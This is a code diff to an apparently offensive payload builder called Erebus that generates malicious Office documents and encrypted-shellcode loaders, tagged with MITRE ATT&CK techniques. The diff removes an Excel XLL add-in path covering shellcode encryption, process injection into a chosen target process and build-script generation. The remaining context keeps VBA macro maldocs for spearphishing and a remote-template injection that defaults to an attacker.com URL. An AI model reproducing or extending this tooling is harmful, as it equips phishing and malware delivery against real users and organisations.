@@ -51,7 +51,6 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
     "generate_excel_payload", "backdoor_existing_excel",
     "generate_command_execution_vba",
-    "generate_xll_template", "register_xll_function",
     "sanitize_pe", "generate_self_hunt_rules",
     "build_obfuscation_cmd", "build_key_extraction_cmd", "build_raw_key_cmd",
     "parse_key_iv", "extract_raw_key_array",
@@ -1081,117 +1080,6 @@ appdomain (self)""",
                 HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                 HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro")
-            ]
-        ),
-
-        # XLL (Excel Add-In DLL) Parameters
-        BuildParameter(
-            name="0.9h XLL Payload Type",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Generate VBA Macro or XLL Add-In DLL for Excel-based payload delivery (MOVED TO SEPARATE PARAMETER)",
-            choices=["VBA Macro",
-                    #   "XLL Add-In DLL"
-                      ],
-            default_value="VBA Macro",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
-
-        # BuildParameter(
-        #     name="0.9i XLL Injection Method",
-        #     parameter_type=BuildParameterType.ChooseOne,
-        #     description="Shellcode injection technique for XLL DLL - CreateThread (self), ProcessInject (remote)",
-        #     choices=["CreateThread (In-Process)", "ProcessInject (Remote)"],
-        #     default_value="CreateThread (In-Process)",
-        #     required=False,
-        #     hide_conditions=[
-        #         HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-        #         HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-        #         HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-        #     ]
-        # ),
-
-        BuildParameter(
-            name="0.9j XLL Target Process",
-            parameter_type=BuildParameterType.String,
-            description="Target process for remote injection (e.g., C:\\Windows\\System32\\notepad.exe)",
-            default_value="C:\\Windows\\System32\\notepad.exe",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.9i XLL Injection Method", operand=HideConditionOperand.EQ, value="CreateThread (In-Process)"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
-
-        BuildParameter(
-            name="0.9k XLL Compiler",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Windows compiler to use for XLL DLL compilation (requires Windows build system)",
-            choices=["MSVC", "MinGW"],
-            default_value="MSVC",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
-
-        BuildParameter(
-            name="0.9l XLL Guardrail Includes",
-            parameter_type=BuildParameterType.String,
-            description="Optional include block inserted before windows.h (e.g., #include <winsock2.h>)",
-            default_value="",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
-
-        BuildParameter(
-            name="0.9m XLL Guardrail Code",
-            parameter_type=BuildParameterType.String,
-            description="Optional guardrail C/C++ code. Must define BOOL ErebusGuardrail(void) and return TRUE to execute.",
-            default_value="",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
-
-        BuildParameter(
-            name="0.9n XLL Guardrail Extra Libs",
-            parameter_type=BuildParameterType.String,
-            description="Optional extra linker flags for XLL builds (e.g., -lws2_32)",
-            default_value="",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
-            ]
-        ),
-
-        BuildParameter(
-            name="0.9o XLL Decoy XLSX",
-            parameter_type=BuildParameterType.File,
-            description="Optional custom XLSX used for XLL decoy arrays (XLSX/ZIP). Defaults to template.xlsx if not supplied.",
-            required=False,
-            hide_conditions=[
-                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
-                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
             ]
         ),
 
@@ -1211,7 +1099,6 @@ appdomain (self)""",
             required=False,
             hide_conditions=[
                 HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
-                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
             ]
         ),
@@ -2392,9 +2279,6 @@ generated if none have been entered.""",
         BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                   step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),
 
-        BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
-                  step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),
-
         BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
             step_description = "Compiling Shellcode Loader"),
 
@@ -2657,7 +2541,6 @@ generated if none have been entered.""",
             ("7.0 Generate Redirector Configs", True, [("T1090.002", "External Proxy / Redirector")]),
             # Maldoc
             ("0.9 Create MalDoc", "Excel (XLSM)", [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
-            ("0.9 Create MalDoc", "Excel (XLL)",  [("T1566.001", "Spearphishing Attachment"), ("T1559.002", "DDE / Add-In")]),
             ("0.9 Create MalDoc", "VBA",           [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
         ]
 
@@ -3271,20 +3154,9 @@ generated if none have been entered.""",
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
             encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
-            encrypted_shellcode_path_xll = PurePath(agent_build_path) / "erebus_xll" / "xll_shellcode.h"
-
-            # Build XLL in the main erebus_xll directory (inside the working build tree)
-            xll_build_dir = Path(agent_build_path) / "erebus_xll"
-            xll_build_dir.mkdir(parents=True, exist_ok=True)
-            xll_source_path = xll_build_dir / "xll_payload.cpp"
-            xll_config_path = xll_build_dir / "xll_config.h"
-            xll_shellcode_path = xll_build_dir / "xll_shellcode.h"
-            xll_inject_path = xll_build_dir / "xll_inject.h"
-
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
             encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
-            encrypted_shellcode_path_xll = str(encrypted_shellcode_path_xll)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -3486,10 +3358,6 @@ generated if none have been entered.""",
                 elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                     shutil.copy(src=str(obfuscated_shellcode_path),
                                 dst=str(encrypted_shellcode_path_sc))
-
-                if self.get_parameter("0.9h XLL Payload Type") == "XLL Add-In DLL":
-                    shutil.copy(src=str(obfuscated_shellcode_path),
-                                dst=str(xll_shellcode_path))
 
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Raw format: re-run shellcrypt in C mode and slice the
@@ -4276,8 +4144,6 @@ generated if none have been entered.""",
                 doc_name = self.get_parameter("0.9d Excel Document Name")
                 obfuscate = self.get_parameter("0.9e Obfuscate VBA")
                 injection_type = self.get_parameter("0.9f MalDoc Injection Type")
-                xll_payload_type = self.get_parameter("0.9h XLL Payload Type")
-
                 try:
                     # Generate VBA payload code based on injection type
                     if injection_type == "Command Execution":
@@ -4371,198 +4237,7 @@ generated if none have been entered.""",
                                 target_process=target_process,
                             )
 
-                    # ==================== XLL (Excel Add-In DLL) Generation ====================
-                    if xll_payload_type == "XLL Add-In DLL":
-                        # Generate C/C++ source code for XLL DLL instead of VBA macro
-                        await self._build_step("[T1559.002] - Generating XLL DLL", "Generating C/C++ XLL source code...", success=True)
-
-                        # Get XLL-specific parameters
-                        xll_injection_method = self.get_parameter("0.9i XLL Injection Method")
-                        xll_target_process = self.get_parameter("0.9j XLL Target Process")
-                        xll_compiler = self.get_parameter("0.9k XLL Compiler")
-                        xll_guardrail_includes = (self.get_parameter("0.9l XLL Guardrail Includes") or "").strip()
-                        xll_guardrail_code = (self.get_parameter("0.9m XLL Guardrail Code") or "").strip()
-                        xll_guardrail_extra_libs = (self.get_parameter("0.9n XLL Guardrail Extra Libs") or "").strip()
-                        xll_guardrail_extra_libs_list = shlex.split(xll_guardrail_extra_libs) if xll_guardrail_extra_libs else []
-
-                        # Map injection method names for template
-                        injection_method_map = {
-                            "CreateThread (In-Process)": "CreateThread",
-                            "ProcessInject (Remote)": "ProcessInject"
-                        }
-                        template_injection_method = injection_method_map.get(xll_injection_method, "CreateThread")
-
-                        # Generate XLL shellcode using shellcrypt
-                        output += "[*] Processing shellcode for XLL injection...\n"
-
-                        shellcrypt_cmd = [
-                            "python",
-                            shellcrypt_path,
-                            "-i", mythic_shellcode_path,
-                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                            "-f", "c",
-                            "-a", "shellcode",
-                            "-o", str(xll_shellcode_path)
-                        ]
-
-                        if self.get_parameter("2.2 Encryption Key") != "NONE":
-                            shellcrypt_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
-
-                        if self.get_parameter("2.0 Compression Type") != "NONE":
-                            shellcrypt_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
-
-                        # Run shellcrypt to generate shellcode directly to xll_shellcode.h
-                        try:
-                            subprocess.check_output(shellcrypt_cmd, text=True)
-                            output += f"[+] Shellcrypt generated xll_shellcode.h\n"
-                        except subprocess.CalledProcessError as e:
-                            output += f"[-] Shellcrypt failed: {str(e)}\n"
-                            raise
-
-                        # Wrap shellcrypt output with header guards
-                        if xll_shellcode_path.exists():
-                            shellcrypt_content = xll_shellcode_path.read_text()
-                            wrapped_content = f'''#ifndef EREBUS_XLL_SHELLCODE_H
-#define EREBUS_XLL_SHELLCODE_H
-#pragma once
-
-#include <stddef.h>
-
-{shellcrypt_content}
-
-static size_t shellcode_len = sizeof(shellcode);
-static size_t key_len = sizeof(key);
-
-#endif
-'''
-                            xll_shellcode_path.write_text(wrapped_content)
-                            output += f"[+] Wrapped shellcode header with guards\n"
-                        else:
-                            output += "[-] Shellcrypt output file not created\n"
-                            raise RuntimeError("Shellcrypt failed to create output file")
-
-                        xll_injection_mode = 0 if xll_injection_method == "CreateThread (In-Process)" else 1
-                        xll_target_process_escaped = xll_target_process.replace("\\", "\\\\")
-
-                        template_dir = Path(__file__).resolve().parent.parent / "agent_code" / "erebus_xll"
-
-                        def _render_xll_template(template_path: Path, replace_map: dict) -> str:
-                            content = template_path.read_text()
-                            for token, value in replace_map.items():
-                                content = content.replace(token, value)
-                            return content
-
-                        replacements = {
-                            "{{XLL_ENCRYPTION_TYPE}}": str(encryption_type_value if encryption_type_value else 0),
-                            "{{XLL_INJECTION_METHOD}}": str(xll_injection_mode),
-                            "{{XLL_TARGET_PROCESS}}": xll_target_process_escaped,
-                            "{{XLL_XLL_FILENAME}}": f"{doc_name}.xll",
-                            "{{XLL_XLSX_FILENAME}}": f"{doc_name}.xlsx",
-                            "{{XLL_ZIP_FILENAME}}": f"{doc_name}.zip",
-                        }
-
-                        xll_config_path.write_text(
-                            _render_xll_template(template_dir / "xll_config.h", replacements)
-                        )
-
-                        # Load Jinja2 template for XLL
-                        template_dir = Path(__file__).parent.parent / "agent_code" / "erebus_xll"
-                        env = Environment(loader=FileSystemLoader(str(template_dir)))
-                        template = env.get_template("xll_payload.j2")
-
-                        # Render template with context
-                        template_context = {
-                            "encryption_type": encryption_type_value if encryption_type_value else "NONE",
-                            "injection_method": template_injection_method,
-                            "injection_method_name": xll_injection_method,
-                            "target_process": xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe",
-                            "generation_timestamp": datetime.now().isoformat(),
-                            "vba_encryption_type": encryption_type_value if encryption_type_value else "NONE",
-                            "guardrail_includes": xll_guardrail_includes,
-                            "guardrail_code": xll_guardrail_code
-                        }
-
-                        xll_source = template.render(template_context)
-
-                        # Save XLL source to temporary file
-                        xll_source_path.write_text(xll_source)
-
-                        output += f"[+] Generated XLL source: {xll_source_path.name}\n"
-                        output += f"[*] Source size: {len(xll_source)} bytes\n"
-                        output += f"[*] Encryption type: {encryption_type_value}\n"
-                        output += f"[*] Injection method: {xll_injection_method}\n"
-
-                        # Generate xll_config.h with configuration macros
-                        xll_config_path = xll_build_dir / "xll_config.h"
-                        injection_method_macro = "0" if xll_injection_method == "Self-injection (Local)" else "1"
-                        encryption_type_macro = {
-                            "NONE": "0",
-                            "XOR": "1",
-                            "RC4": "2"
-                        }.get(encryption_type_value or "NONE", "0")
-
-                        target_process = xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe"
-
-                        xll_config_content = f'''#ifndef EREBUS_XLL_CONFIG_H
-#define EREBUS_XLL_CONFIG_H
-#pragma once
-
-#include <windows.h>
-
-// Encryption: 0 = NONE, 1 = XOR, 2 = RC4
-#define XLL_ENCRYPTION_TYPE {encryption_type_macro}
-
-// Injection: 0 = CreateThread (self), 1 = ProcessInject (remote)
-#define XLL_INJECTION_METHOD {injection_method_macro}
-
-#define XLL_TARGET_PROCESS L"{target_process}"
-
-#define XLL_XLL_FILENAME L"payload.xll"
-#define XLL_XLSX_FILENAME L"payload.xlsx"
-#define XLL_ZIP_FILENAME L"payload.zip"
-
-#endif
-'''
-                        xll_config_path.write_text(xll_config_content)
-                        output += f"[+] Generated xll_config.h\n"
-
-                        try:
-                            xll_output_path = payload_dir / f"{doc_name}.xll"
-                            xll_source_ref = payload_dir / f"{doc_name}.cpp"
-
-                            # XLL compilation requires MSVC on a Windows host via erebus_helper.
-                            # Docker only ships the source; build_xll.bat handles compilation.
-                            shutil.copy(str(xll_source_path), str(xll_source_ref))
-                            output += f"[*] Source code saved to: {xll_source_ref.name}\n"
-
-                            # Copy header files so cl.exe can find them alongside the .cpp
-                            shutil.copy(str(xll_inject_path), str(payload_dir / "xll_inject.h"))
-                            shutil.copy(str(xll_shellcode_path), str(payload_dir / "xll_shellcode.h"))
-                            shutil.copy(str(xll_config_path), str(payload_dir / "xll_config.h"))
-                            output += f"[*] XLL headers copied to payload directory\n"
-
-                            # ---- Generate build_xll.bat for native recompilation on Windows ----
-                            bat_extra = f' --extra-flags "{xll_guardrail_extra_libs}"' if xll_guardrail_extra_libs else ""
-                            bat_lines = [
-                                "@echo off",
-                                "REM Recompile XLL natively on Windows using the bundled helper.",
-                                "REM Run this on a Windows host after extracting the payload archive.",
-                                f'python erebus_helper.py xll --source "{xll_source_ref.name}" --output "{xll_output_path.name}" --compiler {xll_compiler} --arch x64 --optimize Ox{bat_extra}',
-                                "echo XLL compiled: %errorlevel%",
-                            ]
-                            bat_path = payload_dir / "build_xll.bat"
-                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
-                            output += f"[+] Generated build_xll.bat for native Windows recompilation\n"
-
-                        except Exception as e:
-                            output += f"[-] XLL compilation error: {str(e)}\n"
-                            await self._build_step("[T1559.002] - Generating XLL DLL", f"XLL generation failed: {str(e)}", success=False)
-                            raise
-
-                        # Skip VBA obfuscation if using XLL
-                        obfuscate = False
-
-                    if obfuscate and xll_payload_type != "XLL Add-In DLL":
+                    if obfuscate:
                         vba_code = await self.obfuscate_vba(vba_code)
 
                     # Handle VBA Module Only export
@@ -4602,7 +4277,7 @@ static size_t key_len = sizeof(key);
 
                         if maldoc_fmt in ("pptm", "ppam"):
                             # --- PowerPoint path (pure Python, no COM needed) ---
-                            from erebus_wrapper.erebus.modules.plugin_payload_officedoc import PayloadOfficeDocPlugin as _ODP
+                            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _ODP
                             _odp = _ODP()
                             ppt_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
                             if maldoc_fmt == "ppam":
@@ -4622,7 +4297,7 @@ static size_t key_len = sizeof(key);
 
                         elif maldoc_fmt == "docx-remote-template":
                             # --- DOTM remote template injection path ---
-                            from erebus_wrapper.erebus.modules.plugin_payload_officedoc import PayloadOfficeDocPlugin as _ODP
+                            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _ODP
                             _odp = _ODP()
                             dotm_url = self.get_parameter("0.9q DOTM Remote URL") or "https://attacker.com/template.dotm"
                             docx_output = payload_dir / f"{doc_name}.docx"
